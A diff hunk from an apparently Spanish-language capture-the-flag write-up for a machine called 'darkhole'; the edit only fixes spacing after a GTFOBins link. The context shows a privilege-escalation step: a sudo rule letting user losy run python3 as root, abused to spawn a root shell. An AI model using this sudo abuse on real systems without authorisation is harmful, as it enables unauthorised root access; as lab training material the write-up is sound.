@@ -203,7 +203,7 @@ losy@darkhole:~$ sudo -l
 User losy may run the following commands on darkhole:
     (root) /usr/bin/python3
 ```
-Podemos ejecutar **python3** como el usuario **root** de manera temporal... Vamos a [gtfobins](https://gtfobins.github.io/gtfobins/python/#sudo)aun que en este caso no era necesario.
+Podemos ejecutar **python3** como el usuario **root** de manera temporal... Vamos a [gtfobins](https://gtfobins.github.io/gtfobins/python/#sudo) aun que en este caso no era necesario.
 
 ```bash
 losy@darkhole:~$ sudo /usr/bin/python3 -c 'import os; os.system("/bin/sh")'
